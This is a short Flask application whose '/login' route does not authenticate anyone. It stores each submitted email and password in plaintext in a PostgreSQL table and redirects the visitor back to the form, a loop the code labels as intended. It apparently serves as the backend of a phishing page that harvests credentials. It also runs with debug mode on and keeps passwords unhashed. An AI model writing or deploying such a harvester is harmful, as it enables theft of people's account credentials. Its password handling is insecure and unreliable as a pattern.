from flask import Flask, request, render_template, redirect
import psycopg2
import os

app = Flask(__name__)

# Get the PostgreSQL database URL from environment variables
DATABASE_URL = os.getenv('DATABASE_URL')

# Connect to the PostgreSQL database
conn = psycopg2.connect(DATABASE_URL)
cur = conn.cursor()

# Create a users table if it doesn't exist
cur.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email TEXT NOT NULL,
        password TEXT NOT NULL
    )
''')
conn.commit()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    # Insert user data into the PostgreSQL database
    cur.execute('INSERT INTO users (email, password) VALUES (%s, %s)', (email, password))
    conn.commit()

    # Redirect back to the main page (loop behavior)
    return redirect('/')

if __name__ == '__main__':
    app.run(debug=True)
